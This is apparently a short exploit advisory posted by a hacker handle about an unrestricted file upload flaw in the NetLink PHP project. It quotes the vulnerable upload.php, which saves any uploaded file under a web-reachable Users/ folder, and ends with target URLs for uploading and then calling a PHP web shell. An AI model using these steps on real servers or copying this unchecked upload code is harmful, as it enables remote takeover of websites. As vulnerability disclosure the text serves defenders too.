NetLink Remote Arbitrary File Upload Vulnerability
Download: http://sourceforge.net/projects/kp-netlink/
by lumut--
Homepage: lumutcherenza.biz
======================================
 
[upload.php]
 
<?php
extract($_POST);
if ($submit)
{
  $file_name=$_FILES[&#039;filename&#039;][&#039;name&#039;];
    $file_type=$_FILES[&#039;filename&#039;][&#039;type&#039;];
    $file_tmp=$_FILES[&#039;filename&#039;][&#039;tmp_name&#039;];
    $file_size=$_FILES[&#039;filename&#039;][&#039;size&#039;];
 
    $user=$_SESSION[&#039;login&#039;];
    echo "Upload Stats:<br/>";
    echo "<blockquote style=&#039;font-size:10pt;&#039;>";
    echo "Filename: ".$file_name;
    echo "<br/>File Type: ".$file_type;
    echo "<br/>File Size: ".$file_size;
 
    #now that the stats have been declared & displayed, now we process and
upload the file
    $file_dest = "Users/$user/";
    $file_dest = $file_dest . $_FILES[&#039;filename&#039;][&#039;name&#039;];
 
    echo "<br/><br/>Copying $file_name....";
    echo "<br/>Moving copied file to $user&#039;s account...";
    echo "</blockquote>";
    if (move_uploaded_file($_FILES[&#039;filename&#039;][&#039;tmp_name&#039;], $file_dest))
          print "File &#039;$file_name&#039; was successfully uploaded to account
<b>$user</b>.<br/> ";
    else
    {
      print "Possible file upload attack!  Here&#039;s some debugging info:\n";
      print_r($_FILES);
    }
    touch("Users/$user/$file_name");
include("options.php");
echo "<hr color=&#039;#000000&#039;/>";
}
 
?>
 
 
expl: http://[target]/[netlink_path]/upload.php
shell: http://[target]/[netlink_path]/Users/yourshell.php
 
======================================================================
 
thx to : cr4wl3r, Team_elitE, kisame, aNtI_hAcK, kazuya, PunkRock and
manadocoding team :D
======================================================================



